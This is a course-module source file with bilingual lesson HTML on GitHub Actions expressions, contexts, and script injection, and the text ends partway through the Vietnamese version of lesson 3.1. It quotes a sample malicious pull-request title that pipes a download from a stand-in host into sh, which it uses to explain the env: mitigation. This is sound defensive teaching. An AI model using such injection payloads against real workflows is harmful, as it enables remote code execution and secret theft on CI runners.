import { gallery, slide } from './_slides.mjs';

const REF = '?ref=%2Fcourses%2Fgithub-actions%2Flearn&reflabel=GitHub%20Actions';
/**
 * GitHub Actions — Chương 3: Biểu thức và context.
 * Số đo: 74 biểu thức thật của 11 workflow, và một bản tái lập hashFiles()
 * đã KIỂM CHỨNG khớp chính xác với log thật của job 85355071479.
 */

export default {
  title: 'Chapter 3 — Expressions, contexts, and when things exist|||Chương 3 — Biểu thức, context, và lúc nào thứ gì tồn tại',
  slug: 'ga-ch3-bieu-thuc',
  description: '74 biểu thức thật trong kho này, và một bản tái lập `hashFiles()` khớp CHÍNH XÁC với đầu ra thật của GitHub. Cộng cái ranh giới quyết định mọi thứ: `${{ }}` được thay TRƯỚC khi shell nhìn thấy dòng lệnh.',
  sortOrder: 4,
  lessons: [

    /* ─────────────────────────── 3.0 ─────────────────────────── */
    {
      title: '3.0 — Chapter 3 slides: expressions and contexts in pictures|||3.0 — Slide Chương 3: biểu thức và context bằng hình',
      slug: 'ga-3-0-slides',
      type: 'DOCUMENT',
      isFreePreview: true,
      description: 'Bộ 32 slide của Chương 3: dòng thời gian một run, ranh giới ${{ }} và shell, bảng context có ở đâu, ép kiểu đo thật, hàm, và điều kiện if: — mọi log chạy thật trên sân tập.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 3 · Slides</span>
<h2>The whole chapter in 32 slides</h2>
<p class="lead">Skim these before the lessons to get the shape of the chapter, then come back after the quiz as a revision sheet. The centrepiece is slide 3: a run has two evaluation passes — on GitHub before a machine exists, and on the runner when a step starts — and almost every mistake in this chapter comes from confusing the two. Every new log is real, recorded on 24 September 2026 on GitHub-hosted runners in the public sandbox <a href="https://github.com/cuonghoang1103/ga-san-tap" target="_blank" rel="noopener">cuonghoang1103/ga-san-tap</a>, branch <code>ch03-bieu-thuc</code>, plus actionlint 1.7.12.</p>
<p>Slides 3–8 belong to Lesson 3.1, 9–14 to 3.2, 15–20 to 3.3, 21–25 to 3.4 and 26–29 to 3.5. The last three are the chapter's common mistakes, a quick-reference table, and a 45-minute practice session. The slides are in Vietnamese; the diagrams read the same in any language.</p>
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 3 · Slide</span>
<h2>Cả chương trong 32 slide</h2>
<p class="lead">Lướt bộ này trước khi vào bài để nắm hình dạng của chương, rồi quay lại sau bài kiểm tra như một tờ ôn tập. Trung tâm là slide 3: một run có hai lượt tính — trên GitHub khi chưa có máy, và trên runner khi một bước bắt đầu — và gần như mọi lỗi của chương đến từ việc lẫn lộn hai cái. Mọi log mới là THẬT, ghi ngày 24/09/2026 trên runner của GitHub trong kho sân tập công khai <a href="https://github.com/cuonghoang1103/ga-san-tap" target="_blank" rel="noopener">cuonghoang1103/ga-san-tap</a>, nhánh <code>ch03-bieu-thuc</code>, cộng actionlint 1.7.12.</p>
<p>Slide 3–8 thuộc Bài 3.1, 9–14 thuộc 3.2, 15–20 thuộc 3.3, 21–25 thuộc 3.4 và 26–29 thuộc 3.5. Ba slide cuối là những sai lầm hay gặp của chương, một bảng tra nhanh và một buổi thực hành 45 phút. Slide bằng tiếng Việt; các hình đọc như nhau ở mọi ngôn ngữ.</p>
</div>
${gallery('ga-03', [
  [1, 'Bìa'],
  [2, 'Bản đồ chương'],
  [3, 'Một run có hai lượt tính'],
  [4, 'Tên bước mang giá trị bước trước'],
  [5, 'github.event vào run: là để người lạ viết mã'],
  [6, 'Vá: đưa giá trị qua env:'],
  [7, 'actionlint bắt tiêu đề nhưng bỏ sót tên nhánh'],
  [8, 'Chỉ nháy đơn; lỗi cú pháp hỏng cả file'],
  [9, 'Bảng “Context availability”'],
  [10, 'Dùng context sai chỗ: file hỏng'],
  [11, 'api-backend: 94 biểu thức'],
  [12, 'Context vắng mặt ra rỗng'],
  [13, 'steps: id + GITHUB_OUTPUT; outcome ≠ conclusion'],
  [14, 'In context ra qua env:'],
  [15, 'So khác kiểu: ép thành số'],
  [16, "Chỉ năm giá trị là SAI; 'false' là ĐÚNG"],
  [17, 'if: chữ trong file vs giá trị lúc chạy'],
  [18, '17 cách viết if:'],
  [19, "Bẫy: chuỗi 'false' lúc chạy"],
  [20, 'So chuỗi không phân biệt hoa thường'],
  [21, 'Bảng hàm với kết quả thật'],
  [22, 'case(): chọn giá trị theo điều kiện'],
  [23, 'hashFiles(): thứ tự mẫu đổi thì khoá đổi'],
  [24, 'fromJSON(): ma trận và timeout động'],
  [25, 'Ba hàm cần đúng chỗ'],
  [26, 'Sau một bước hỏng: mỗi hàm trạng thái'],
  [27, 'Bấm huỷ: always() và cancelled()'],
  [28, 'Đặt điều kiện ở đâu: bốn tầng'],
  [29, 'Năm điều kiện chết'],
  [30, 'Sai lầm hay gặp'],
  [31, 'Bảng tra nhanh'],
  [32, 'Thực hành Chương 3'],
])}
`,
    },

    /* ─────────────────────────── 3.1 ─────────────────────────── */
    {
      title: '3.1 — The boundary: what is substituted before the shell sees it|||3.1 — Ranh giới: cái gì bị thay TRƯỚC khi shell nhìn thấy',
      slug: 'ga-3-1-ranh-gioi',
      type: 'VIDEO',
      description: '`\${{ }}` KHÔNG phải biến shell. Nó bị thay bằng chuỗi thô trước khi tệp script được ghi ra đĩa — nên một tiêu đề PR chứa dấu nháy vừa chạy được lệnh của người lạ. Cộng đúng chỗ để đọc: log thật in ra `shell: /usr/bin/bash -e {0}` ở MỌI bước.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 3 · Lesson 3.1</span>
<h2>The boundary: what is substituted before the shell sees it</h2>
<p class="lead">There are two languages in a workflow file and they run at different times. Getting that ordering wrong is not a style mistake — it is the mechanism behind the most common serious vulnerability in GitHub Actions, and it takes three lines to demonstrate.</p>

<h3>Two evaluators, in order</h3>
${slide('ga-03', 3, 'A run has two evaluation passes: on GitHub first, on the runner second')}
<p>The picture above is the map for the whole chapter. Six stages, left to right. The first four happen on GitHub before any machine exists: the event is fixed, the YAML is read and checked, the job is <em>planned</em> (its <code>if:</code>, its matrix, its <code>runs-on</code> label, its name, its timeout), and then it waits in a queue. Only at the dashed line does a runner pick the job up, and only from then on do <code>runner.os</code>, <code>steps.*</code> and the files on disk exist. The sixth stage, the shell, never sees an expression at all.</p>

<div class="lz-flow">
<div class="lz-step"><span class="lz-k">first</span><span class="lz-t">GitHub&#39;s expression engine</span><span class="lz-d">finds every <code>&#36;{{ ... }}</code> and replaces it with a plain string. For job-level keys (<code>runs-on</code>, the job&#39;s <code>if:</code>, the matrix) this happens on GitHub&#39;s servers; for step-level keys (<code>run</code>, <code>env</code>, <code>with</code>, the step&#39;s <code>if:</code>) the same engine runs inside the runner, at the moment the step starts. Either way it is finished before the script file is written. (Corrected 24/09/2026: this line used to say all substitution happens on GitHub&#39;s side; the measurement below shows otherwise.)</span></div>
<div class="lz-step"><span class="lz-k">then</span><span class="lz-t">the runner writes a script file</span><span class="lz-d">the fully substituted text becomes a real file on the runner</span></div>
<div class="lz-step"><span class="lz-k">last</span><span class="lz-t">the shell</span><span class="lz-d">runs that file. By this point the expression is gone — the shell never knew there was one</span></div>
</div>

<p>The log of any real run states the third step explicitly. From job 85355071479 of this repository, printed before <em>every</em> step:</p>

<div class="out">shell: /usr/bin/bash -e {0}</div>

<p>That <code>{0}</code> is the script file. Everything the expression engine produced has already been baked into it. Which leads directly to the consequence:</p>

<div class="callout warn">
<p><strong><code>&#36;{{ }}</code> is not a variable. It is textual substitution into source code.</strong> If the substituted value contains a quote, a newline, a semicolon or a backtick, those characters become <em>part of the script</em> — not part of a string in the script. There is no quoting that protects you, because the quoting you would write is itself part of the text being substituted into.</p>
</div>

<h3>Proof that step-level expressions are evaluated on the runner</h3>
${slide('ga-03', 4, 'Evidence: a step name carries a value the previous step wrote a moment earlier')}
<p>"The expression is substituted before the shell runs" is easy to say and easy to half-believe. Here is a run that removes the doubt. The first step writes the current time, to the millisecond, into <code>$GITHUB_OUTPUT</code>. The <em>name</em> of the second step is an expression that reads that output. GitHub cannot know that time in advance: it did not exist until the first step ran on the runner. Yet the finished job (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000179955" target="_blank" rel="noopener">run 36000179955</a>, on <code>ubuntu-24.04</code>) lists:</p>
<div class="out">2 Buoc dau ghi output
3 Buoc sau thay x86_64 luc 12:37:12.558
4 Run echo xin-chao &gt; ghi-luc-chay.txt
5 hashFiles tinh LUC BUOC CHAY</div>
<p>The same job on <code>ubuntu-24.04-arm</code>, in the same run, named its step <code>Buoc sau thay aarch64 luc 12:37:15.058</code>: a different machine, a different time. <code>hashFiles()</code> tells the same story from the other side. In step 3 it hashed <code>ghi-luc-chay.txt</code> before the file existed and returned an empty string; in step 5, after step 4 created the file, the same expression returned <code>27c99b3d29fa…544696</code>, which is exactly the double SHA-256 of <code>xin-chao</code> plus a newline, recomputed on a Mac. An expression in a step is evaluated <em>when that step starts, on that machine</em>.</p>
<div class="callout">
<p><strong>Why this matters for the rest of the chapter.</strong> Once you know <em>where</em> an expression is evaluated you can predict what it may see. A job-level <code>if:</code> is evaluated on GitHub before a machine is requested, so it cannot read <code>runner.os</code>: there is no runner yet. A step-level <code>if:</code> can. Lesson 3.2 turns this into the context-availability table; for now, remember the dashed line.</p>
</div>
<h3>The three lines</h3>
<pre><code><span class="tok-comment"># HONG — tieu de PR duoc GHEP THANG vao ma nguon</span>
- run: echo "PR: &#36;{{ github.event.pull_request.title }}"</code></pre>

<p>A pull request titled <code>a"; curl evil.example/x | sh; #</code> produces this script on the runner:</p>

<div class="out">echo "PR: a"; curl evil.example/x | sh; #"</div>

<p>Three commands where the author wrote one. Anyone who can open a pull request chooses the title, so anyone who can open a pull request can run commands on the runner. And note what makes this worse than it looks: on a <code>pull_request</code> run from a fork the secrets are absent, but on a <code>push</code> run, or under <code>pull_request_target</code> (lesson 1.4), they are not.</p>

<h3>Why this is a security boundary, not a style choice</h3>
${slide('ga-03', 5, 'Pasting github.event values into run: lets outside text become part of the command')}
<p>Because the expression is turned into script text before the shell runs, a value that someone <em>outside</em> your team can set — a pull request title, a branch name, a commit message — becomes part of the command, not an argument to it. This is "script injection", and it is the same mistake as SQL injection: data concatenated into a language instead of passed to it as data.</p>
<p>A safe, harmless demonstration exists on the sandbox (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000955142" target="_blank" rel="noopener">run 36000955142</a>, from a pull request that was closed without merging). The demo used an inert marker, <code>$(echo hi)</code>, in a place a workflow pasted <code>&#36;{{ github.event.pull_request.title }}</code> straight into <code>run:</code>. In the log, instead of the literal five characters <code>$(echo hi)</code>, the word <code>hi</code> appeared on its own — the shell had treated the marker as a command to run rather than as text to print. That is the whole risk in one observation: the marker was <em>evaluated</em>, and a real attacker would put something harmful where <code>echo hi</code> was.</p>
<div class="callout warn">
<p><strong>The danger is that the text is executed at all — not what the demo printed.</strong> A step whose only job is to echo a title for a log line is still an injection point, because the shell runs whatever is in the script file, and the title is now in that file. On a <code>push</code> run, or under <code>pull_request_target</code>, the job also has access to secrets — which is why this class of bug is taken seriously even when the visible step "just prints".</p>
</div>
${slide('ga-03', 6, 'The fix: route the value through env: and read it as a quoted variable')}
<p>The fix is small and complete: put the value in an <code>env:</code> block and read it as a quoted shell variable.</p>
<pre><code><span class="tok-comment"># DUNG — bien moi truong, shell doc GIA TRI chu khong doc MA</span>
- run: echo "PR: \$TIEU_DE"
  env:
    TIEU_DE: &#36;{{ github.event.pull_request.title }}</code></pre>

<p>The substitution still happens — but into the <code>env:</code> block, where the value becomes an environment variable rather than script text. <code>\$TIEU_DE</code> inside the script is read by the shell at runtime, as data. The quote in the title is now just a quote in a string.</p>
${slide('ga-03', 7, 'A linter catches the obvious case but not every one')}
<p>In the same demo the guarded job — same title, routed through <code>env:</code> — printed the marker exactly as typed, including the <code>$( )</code>, and ran nothing. Two extra lines removed the entire problem.</p>
<h3>Defending in depth</h3>
<div class="kv-grid">
<div class="kv"><span class="k">route outside values through <code>env:</code></span><span class="v">the single habit that covers the whole class: never place a <code>&#36;{{ github.event.* }}</code> or <code>&#36;{{ github.head_ref }}</code> directly in <code>run:</code>; read <code>"$VAR"</code> instead</span></div>
<div class="kv"><span class="k">be careful with <code>pull_request_target</code></span><span class="v">it runs with the base repo&#39;s secrets; checking out and building the pull request&#39;s code under it combines untrusted code with your secrets. Prefer plain <code>pull_request</code> for anything that runs PR code</span></div>
<div class="kv"><span class="k">least privilege for the token</span><span class="v">set <code>permissions:</code> to the minimum a job needs; a narrow <code>GITHUB_TOKEN</code> limits what an injected command could reach</span></div>
<div class="kv"><span class="k">lint, but do not rely on lint alone</span><span class="v"><code>actionlint</code> flags many injectable expressions, and <code>zizmor</code> is a dedicated workflow security scanner. Measured here, actionlint warned about the PR title but <em>not</em> about <code>github.head_ref</code> on the next line, which was just as exploitable — so keep the "outside values go through <code>env:</code>" rule in your head</span></div>
</div>


<div class="callout ok">
<p><strong>The rule that covers every case:</strong> never put a <code>&#36;{{ }}</code> whose value someone else controls directly inside <code>run:</code>. Route it through <code>env:</code> and reference the environment variable. This costs two extra lines and removes the entire class of problem. Chapter 7 measures which context values are attacker-controlled — the list is longer than "the PR title".</p>
</div>

<h3>Where expressions are allowed, and where they are implicit</h3>
<div class="kv-grid">
<div class="kv"><span class="k">most places need <code>&#36;{{ }}</code></span><span class="v"><code>run:</code>, <code>with:</code>, <code>env:</code>, <code>name:</code>, <code>runs-on:</code>, <code>key:</code> — anywhere a string is expected, the braces mark the part to evaluate</span></div>
<div class="kv"><span class="k"><code>if:</code> is already an expression</span><span class="v"><code>if: github.event_name == 'push'</code> works with no braces. The whole value is evaluated as an expression, so the braces are optional there — and adding them is harmless but not required</span></div>
<div class="kv"><span class="k">the <code>if:</code> trap</span><span class="v">(Corrected 24/09/2026. This box used to say <code>if: 'false'</code> runs the step. Measured on GitHub it does not: the quotes belong to YAML, the text <code>false</code> is then read as an expression, and the step is skipped.) The real trap is <strong>text outside the braces</strong>: <code>if: &#36;{{ github.ref_name }} == 'main'</code> is not a comparison but a string such as <code>ch03 == 'main'</code>, which is non-empty and so true on every branch. Its runtime cousin: a value that arrives <em>while running</em> as the string <code>'false'</code> (a step output, an <code>env</code> value) is truthy. Both fail <em>open</em>; lesson 3.3 measures seventeen forms</span></div>
<div class="kv"><span class="k">not allowed at all</span><span class="v">the <code>on:</code> block. You cannot compute a trigger, a branch filter or a cron schedule — those are read before any context exists</span></div>
</div>

<h3>Quoting inside an expression</h3>
${slide('ga-03', 8, 'Single quotes only; a syntax error fails the whole file before any machine starts')}

<p>The expression language uses <strong>single quotes only</strong>. Double quotes are a syntax error, and an apostrophe inside a literal is escaped by doubling it:</p>

<pre><code><span class="tok-comment"># dung</span>
if: github.ref == 'refs/heads/main'
<span class="tok-comment"># SAI — nhay kep khong hop le trong bieu thuc</span>
if: github.ref == "refs/heads/main"
<span class="tok-comment"># nhay don trong chuoi: viet doi len</span>
run: echo &#36;{{ format('it''s fine') }}</code></pre>

<div class="pitfall">
<p><strong>Trap — YAML quoting and expression quoting stacked on top of each other.</strong> A value like <code>&#36;{{ ... }}</code> at the start of a YAML value must be quoted <em>as YAML</em>, because <code>{</code> starts a YAML flow mapping — so <code>key: &#36;{{ x }}</code> parses, but <code>key: {{ x }}</code> does not, and <code>key: "&#36;{{ x }}"</code> is the safe form when the value begins with a brace. Two quoting systems, applied by two parsers, on one line. When a workflow fails to parse and the error points at a line that looks obviously fine, this is usually why.</p>
</div>

<h3>A syntax error is caught when the file is read, and costs zero seconds</h3>
<p>Write a comparison with double quotes and GitHub rejects the whole workflow file before planning any job. The run exists, it is red, it lasted 0 seconds, and it has no jobs and no logs: only one line on the run page (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000817664" target="_blank" rel="noopener">run 36000817664</a>):</p>
<div class="out">Invalid workflow file: .github/workflows/ch03-sai-cho-2.yml#L1
(Line: 20, Col: 9): Unexpected symbol: '"refs/heads/main"'. Located at position 15 within expression:
github.ref == "refs/heads/main"</div>
<p>Two practical consequences. First, <code>gh run view</code> in a terminal only says <em>"This run likely failed because of a workflow file issue"</em>; the actual message is on the web page. Second, because the check happens when the file is read, a broken file breaks <em>every</em> trigger of that workflow, including the push you make to fix something else. actionlint gives the same error, with its column, before you push:</p>
<div class="out">ch03-sai-cho.yml:27:23: got unexpected character '"' while lexing expression, expecting 'a'..'z', ...
do you mean string literals? only single quotes are available for string delimiter [expression]</div>
<div class="kv-grid">
<div class="kv"><span class="k">a literal apostrophe</span><span class="v">double it: <code>&#36;{{ format('it''s {0}', 'fine') }}</code></span></div>
<div class="kv"><span class="k">an expression that starts with <code>!</code></span><span class="v"><code>!</code> means something to YAML (a tag), so wrap it: <code>if: &#36;{{ !cancelled() }}</code> or <code>if: '!cancelled()'</code>. Both ran green in <a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000180005" target="_blank" rel="noopener">run 36000180005</a></span></div>
<div class="kv"><span class="k">a literal <code>&#36;{{</code> in a command</span><span class="v">there is no escape character; write <code>&#36;{{ '&#36;{{' }}</code> so the engine outputs the two characters for you</span></div>
<div class="kv"><span class="k">an expression in a step <code>name:</code></span><span class="v">it is evaluated too. Writing <code>&#36;{{ !cancelled() }}</code> in a step name while preparing this lesson produced a real actionlint error: <code>calling function "cancelled" is not allowed here</code>, because status functions only exist in <code>if:</code></span></div>
</div>
<h3>What the substitution looks like in a real log</h3>
<p>The log prints the script <em>after</em> substitution, which is the single most useful debugging fact in this chapter. From the same run, an <code>env:</code> block already expanded:</p>

<div class="out">##[group]Run ssh vps "
  export CUONG_BACKEND_IMAGE=ghcr.io/cuonghoang1103/api-backend-backend:main
  ...
shell: /usr/bin/bash -e {0}
env:
  REGISTRY: ghcr.io
  IMAGE_OWNER: cuonghoang1103
  BACKEND_IMAGE: ghcr.io/cuonghoang1103/api-backend-backend
  FRONTEND_IMAGE: ghcr.io/cuonghoang1103/api-backend-frontend</div>

<div class="callout">
<p><strong>Read the expanded script, not the YAML.</strong> When a step does something you did not intend, the group header in the log shows exactly what the shell received — every expression already resolved. Comparing that against what you wrote answers "was my expression wrong?" in one glance, and it answers it without a re-run. Secrets are the exception: they are masked as <code>***</code>, which is also how you confirm a value <em>was</em> treated as a secret.</p>
</div>

<h3>Two shapes worth keeping</h3>
<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname">expression → <code>env:</code> → shell variable</span><span class="lz-lnote">the safe default for anything from the <code>github</code> context. Two extra lines, zero injection surface</span></div>
<div class="lz-layer"><span class="lz-lname">expression → <code>with:</code> → action input</span><span class="lz-lnote">actions receive inputs as environment variables, so this path is already safe from shell injection. It is not safe from <em>the action</em> doing something unsafe with the value — Chapter 4 covers what an action can actually do</span></div>
<div class="lz-layer"><span class="lz-lname">expression directly in <code>run:</code></span><span class="lz-lnote">acceptable only for values you fully control: <code>&#36;{{ runner.os }}</code>, <code>&#36;{{ matrix.os }}</code>, a literal you wrote in <code>env:</code> yourself. Never for anything a user typed</span></div>
<div class="lz-layer"><span class="lz-lname">expression in a cache <code>key:</code></span><span class="lz-lnote">no shell involved at all — the key is a string the cache action receives. This is where <code>hashFiles()</code> lives, and 3.4 verifies exactly what it computes</span></div>
</div>

<div class="callout ok">
<p><strong>The one sentence.</strong> The expression engine finishes its work before the runner writes the script file, so <code>&#36;{{ }}</code> in a <code>run:</code> block is code generation — and the fix is always to move the value into <code>env:</code>, where it becomes data.</p>
</div>

<h3>Run it step by step: the life of one <code>run:</code> line</h3>
<ol>
<li><strong>You push.</strong> GitHub fixes the event payload (title, branch, commits) as it is at this instant.</li>
<li><strong>GitHub reads the file.</strong> Every <code>&#36;{{ }}</code> is parsed. Wrong syntax or a context used in the wrong place: the run is red at 0 seconds.</li>
<li><strong>GitHub plans the job.</strong> Job-level expressions are evaluated: <code>if:</code>, the matrix, <code>runs-on</code>. A job whose <code>if:</code> is false is marked skipped here and never gets a machine (<code>runner_name</code> is <code>null</code> in the API, measured in <a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000179955" target="_blank" rel="noopener">run 36000179955</a>).</li>
<li><strong>A runner takes the job.</strong> Now <code>runner</code>, <code>job</code> and the workspace exist.</li>
<li><strong>The step starts.</strong> The runner evaluates that step&#39;s <code>if:</code>, then its <code>name</code>, <code>env</code> and the text of <code>run:</code>. The result is written to a file, the <code>{0}</code> in <code>shell: /usr/bin/bash -e {0}</code>.</li>
<li><strong>The shell runs the file.</strong> It only sees text. Whatever the expressions produced is now indistinguishable from what you typed.</li>
</ol>

<h3>When to put a value in <code>env:</code>, and when inline is fine</h3>
<table>
<thead><tr><th>Value</th><th>Inline in <code>run:</code></th><th>Why</th></tr></thead>
<tbody>
<tr><td><code>runner.os</code>, <code>matrix.*</code> you defined, <code>github.sha</code>, <code>github.run_id</code></td><td>fine</td><td>fixed format, you or GitHub chose it</td></tr>
<tr><td><code>secrets.*</code></td><td>prefer <code>env:</code></td><td>the value then never appears in the script text, and quotes or <code>$</code> inside it cannot break the command</td></tr>
<tr><td>anything under <code>github.event.*</code>, <code>github.head_ref</code></td><td>always <code>env:</code></td><td>free text chosen by whoever triggered the event</td></tr>
<tr><td>JSON from <code>toJSON(...)</code></td><td>always <code>env:</code></td><td>multi-line text full of quotes; inline it breaks the script even with honest data</td></tr>
</tbody>
</table>

<div class="callout">
<p><strong>Common interview questions.</strong></p>
<p><strong>Q: Where are expressions evaluated?</strong><br>A: Job-level keys (<code>if</code>, <code>strategy</code>, <code>runs-on</code>, <code>timeout-minutes</code>) on GitHub before a runner is assigned; step-level keys (<code>if</code>, <code>name</code>, <code>env</code>, <code>with</code>, <code>run</code>) on the runner when the step starts. That is why <code>runner.*</code> and <code>steps.*</code> only exist at step level, and why a job-level <code>if: runner.os == 'Linux'</code> makes the file invalid.</p>
<p><strong>Q: What is the difference between <code>&#36;{{ env.X }}</code> and <code>$X</code> in a <code>run:</code> block?</strong><br>A: <code>&#36;{{ env.X }}</code> is replaced by its text before the shell starts, so it becomes part of the script; <code>$X</code> is read by the shell at runtime as a variable. For values you do not fully control, prefer <code>"$X"</code> with quotes.</p>
<p><strong>Q: A workflow run is red after 0 seconds with no jobs. What happened?</strong><br>A: The file failed validation: YAML or expression syntax, or a context used where it is not available. The message is on the run page ("Invalid workflow file"); reproduce it locally with actionlint.</p>
</div>

<h3>🧪 Practice (15–20 min)</h3>
<div class="callout ok"><p><strong>Scenario:</strong> a classmate insists that <code>&#36;{{ }}</code> "is just a shell variable with a different syntax". You want a run that proves otherwise.</p><ol>
<li>In a test repository of yours, add <code>.github/workflows/luc-nao.yml</code> triggered by <code>push</code>. Step 1 (<code>id: dau</code>) writes <code>echo "luc=$(date -u +%H:%M:%S.%N | cut -c1-12)" &gt;&gt; "$GITHUB_OUTPUT"</code>.</li>
<li>Step 2 has <code>name: &#36;{{ format('Sau luc {0}', steps.dau.outputs.luc) }}</code> and runs <code>echo "&#36;{{ hashFiles('moi.txt') }}"</code>. Step 3 runs <code>echo hi &gt; moi.txt</code>. Step 4 repeats the <code>hashFiles</code> echo.</li>
<li>Add a second job with <code>if: runner.os == 'Linux'</code> at job level. Run actionlint locally first and read its message; then push anyway and open the run page.</li>
<li>Remove the broken job, push again, and list step names with <code>gh run view &lt;id&gt; --json jobs --jq '.jobs[].steps[].name'</code>.</li></ol>
<p><strong>Done when:</strong> one step name contains a time with milliseconds; the first <code>hashFiles</code> line is empty and the second is a 64-character hash; the run with the job-level <code>runner</code> condition failed in 0 seconds with "Unrecognized named-value: 'runner'"; and you can explain, using the dashed line of slide 3, why.</p></div>

<h3>🗂 Key terms</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Expression</span><span class="v">Anything inside <code>&#36;{{ }}</code>. Evaluated by GitHub&#39;s engine (on the server or in the runner), never by the shell.</span></div>
  <div class="kv"><span class="k">Substitution</span><span class="v">Replacing the expression with its value as plain text, before the script file is written.</span></div>
  <div class="kv"><span class="k">Job level / step level</span><span class="v">Keys directly under a job are evaluated before a machine exists; keys inside <code>steps:</code> are evaluated on the runner.</span></div>
  <div class="kv"><span class="k">Script file <code>{0}</code></span><span class="v">The temporary file the runner writes for each <code>run:</code> step and hands to the shell.</span></div>
  <div class="kv"><span class="k"><code>env:</code> indirection</span><span class="v">Putting a value in an environment variable and reading <code>"$VAR"</code>: the shell treats it as data.</span></div>
  <div class="kv"><span class="k">Invalid workflow file</span><span class="v">A syntax or context error found when the YAML is read: the run fails in 0 seconds with no jobs.</span></div>
  <div class="kv"><span class="k">actionlint</span><span class="v">A static checker for workflow files; catches wrong contexts, bad quoting and constant conditions before you push.</span></div>
</div>

<h3>📌 Summary</h3>
<ul>
<li><code>&#36;{{ }}</code> is replaced with text before the shell exists; the shell only ever runs the finished file.</li>
<li>Job-level expressions are evaluated on GitHub before a machine is requested; step-level ones on the runner when the step starts. Measured: a step name carried a time written 0.1 s earlier.</li>
<li>Values you do not fully control go through <code>env:</code> and are read as <code>"$VAR"</code>; values you defined yourself may be inline.</li>
<li>Expressions use single quotes only; an apostrophe is doubled; an expression starting with <code>!</code> must be wrapped.</li>
<li>A syntax or context error makes the whole file invalid: red at 0 seconds, no jobs, message only on the web page.</li>
<li>Read the expanded script in the log group header, not the YAML, when a step does something unexpected.</li>
</ul>

<h3>Sources</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Expressions</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/expressions — the full operator table, the single-quote rule, the doubled-apostrophe escape, and the statement that <code>if:</code> is evaluated as an expression without braces.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Security Lab — Untrusted input in GitHub Actions</span><span class="lc-sub">securitylab.github.com/resources/github-actions-untrusted-input/ — the original catalogue of injectable context values and the <code>env:</code> mitigation, with real vulnerable workflows found in public repositories.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Security hardening for GitHub Actions: script injections</span><span class="lc-sub">docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections — GitHub&#39;s own writeup of the three-line example above, including the list of contexts to treat as attacker-controlled.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Authentication — injection is one bug with many names</span><span class="lc-sub">/courses/authentication/learn${REF} — SQL injection, command injection and this are the same mistake in three syntaxes: data concatenated into a language instead of passed as a parameter.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Linux &amp; Bash — quoting, word splitting, and why a variable is not text</span><span class="lc-sub">/courses/linux-bash/learn${REF} — what the shell does with a value once it is in a variable, which is exactly the behaviour the <code>env:</code> fix relies on.</span></span></div>
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 3 · Bài 3.1</span>
<h2>Ranh giới: cái gì bị thay TRƯỚC khi shell nhìn thấy</h2>
<p class="lead">Có HAI ngôn ngữ trong một tệp workflow và chúng chạy vào những thời điểm khác nhau. Nhầm cái thứ tự ấy không phải lỗi phong cách — nó là cơ chế đứng sau lỗ hổng nghiêm trọng phổ biến nhất của GitHub Actions, và chỉ cần ba dòng để minh hoạ.</p>

<h3>Hai bộ đánh giá, theo thứ tự</h3>
${slide('ga-03', 3, 'Một run có hai lượt tính: trên GitHub trước, trên runner sau')}
<p>Hình trên là tấm bản đồ của cả chương. Sáu chặng, từ trái sang phải. Bốn chặng đầu diễn ra trên GitHub khi chưa có cỗ máy nào: sự kiện được chốt, YAML được đọc và kiểm, job được <em>LẬP KẾ HOẠCH</em> (<code>if:</code> của nó, ma trận, nhãn <code>runs-on</code>, tên, timeout), rồi nó đứng xếp hàng. Chỉ tới đường gạch đứt thì một runner mới nhận job, và chỉ từ đó trở đi <code>runner.os</code>, <code>steps.*</code> và các tệp trên đĩa mới tồn tại. Chặng thứ sáu, shell, không bao giờ nhìn thấy một biểu thức nào.</p>

<div class="lz-flow">
<div class="lz-step"><span class="lz-k">đầu tiên</span><span class="lz-t">bộ máy biểu thức của GitHub</span><span class="lz-d">tìm mọi <code>&#36;{{ ... }}</code> rồi thay bằng một chuỗi trơn. Với các khoá ở mức JOB (<code>runs-on</code>, <code>if:</code> của job, ma trận) việc này xảy ra trên máy chủ GitHub; với các khoá ở mức BƯỚC (<code>run</code>, <code>env</code>, <code>with</code>, <code>if:</code> của bước) cũng bộ máy ấy chạy BÊN TRONG runner, đúng lúc bước bắt đầu. Dù ở đâu, nó cũng xong TRƯỚC khi tệp script được ghi ra. (Đính chính 24/09/2026: bản trước nói mọi phép thay đều xảy ra bên phía GitHub; phép đo bên dưới cho thấy không phải vậy.)</span></div>
<div class="lz-step"><span class="lz-k">rồi</span><span class="lz-t">runner ghi ra một tệp script</span><span class="lz-d">phần chữ đã thay xong trở thành một tệp thật trên runner</span></div>
<div class="lz-step"><span class="lz-k">cuối cùng</span><span class="lz-t">shell</span><span class="lz-d">chạy tệp ấy. Tới lúc này biểu thức đã biến mất — shell chưa từng biết là có một biểu thức</span></div>
</div>

<p>Log của bất kỳ lần chạy thật nào cũng phát biểu bước thứ ba một cách tường minh. Từ job 85355071479 của kho này, in ra trước <em>MỌI</em> bước:</p>

<div class="out">shell: /usr/bin/bash -e {0}</div>

<p>Cái <code>{0}</code> ấy là tệp script. Mọi thứ bộ máy biểu thức sinh ra đã được nướng sẵn vào trong đó. Từ đó dẫn thẳng tới hệ quả:</p>

<div class="callout warn">
